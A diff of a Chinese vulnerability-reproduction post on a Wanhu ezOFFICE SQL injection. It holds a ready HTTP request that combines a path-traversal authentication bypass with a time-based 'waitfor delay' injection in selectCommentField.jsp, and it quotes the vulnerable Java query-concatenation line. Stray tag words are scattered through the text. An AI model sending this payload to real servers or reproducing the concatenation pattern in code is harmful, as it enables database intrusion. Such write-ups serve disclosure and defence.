@@ -20,14 +20,6 @@ Java（编程语言）
 
 # 漏洞复现
 
-深入探索
-
-计算机科学
-
-参考信息
-
-Blog
-
 ```
 GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_database/dropdownselect/selectCommentField.jsp?tableId=1+waitfor+delay+'0:0:6'--+- HTTP/1.1
 Host: ezoffice.mrxn.net
@@ -43,7 +35,7 @@ Host: ezoffice.mrxn.net
 
 > 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
 >
-> 编程
+> 软件
 
 selectCommentField.jsp 主要业务逻辑代码如下，非常简单！
 
@@ -98,7 +90,7 @@ try {
 
 主要关注 这一行
 
-软件
+网络
 
 ```
 java.sql.ResultSet rs = stmt.executeQuery("select field_name,field_desname from tfield where (field_show=401) and field_table="+ tableId + " order by field_id");
